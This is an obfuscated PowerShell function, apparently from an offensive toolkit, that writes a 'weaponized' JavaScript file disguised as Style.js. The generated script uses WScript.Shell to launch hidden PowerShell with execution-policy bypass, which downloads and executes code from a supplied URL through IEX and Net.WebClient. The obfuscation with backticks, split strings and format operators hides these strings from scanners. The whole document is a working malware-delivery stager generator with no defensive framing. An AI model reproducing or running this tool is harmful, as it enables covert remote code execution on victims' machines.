function ou`T-JS
{
 

    [CmdletBinding()] Param(
        
        [Parameter(POSitIOn = 0, MANDATory = ${fA`Lse})]
        [String]
        ${Pa`YLOad},
        
        [Parameter(positION = 1, MAnDAToRY = ${f`A`Lse})]
        [String]
        ${P`AYl`OaduRL},

        [Parameter(PosItION = 2, MAndatORy = ${faL`se})]
        [String]
        ${ARg`UMEn`Ts},

        [Parameter(POSItion = 3, MANdaTOrY = ${F`Al`sE})]
        [String]
        ${oUt`P`UtP`ATh} = "$pwd\Style.js"
    )

    
    if(${p`A`ylO`ADURL})
    {
        ${pAy`l`OaD} = ('po'+'wer'+'shell'+' '+'-'+'w '+'h '+'-'+'nologo '+'-no'+'profi'+'le '+'-ep'+' '+'by'+'pass'+' '+'IEX'+' '+'((N'+'ew-'+'O'+'b'+'ject '+"Net.WebClient).DownloadString('$PayloadURL'));$Arguments")
    }  
    
    ${c`Md} = ((('p'+'0S
c ') -crepLACe  ([ChaR]112+[ChaR]48+[ChaR]83),[ChaR]34)+'= '+('{1}{0'+'}Pay'+'load{1};
r ')-F [CHar]36,[CHar]34+'= '+'new'+' '+('Activ'+'eXObject({0}WS'+'cript.S'+'h'+'ell{0}'+').'+'Run'+'(c,0'+',tru'+'e);
{0}') -F [cHaR]34)

    &("{2}{1}{0}"-f 'ile','-F','Out') -InputObject ${C`md} -FilePath ${OUT`p`UtpatH} -Encoding ("{1}{0}"-f 't','defaul')
    .("{2}{0}{3}{1}" -f'ite','Output','Wr','-') ('Weapo'+'nized'+' '+'JS'+' '+'file'+' '+'written'+' '+'to'+' '+"$OutputPath")
}


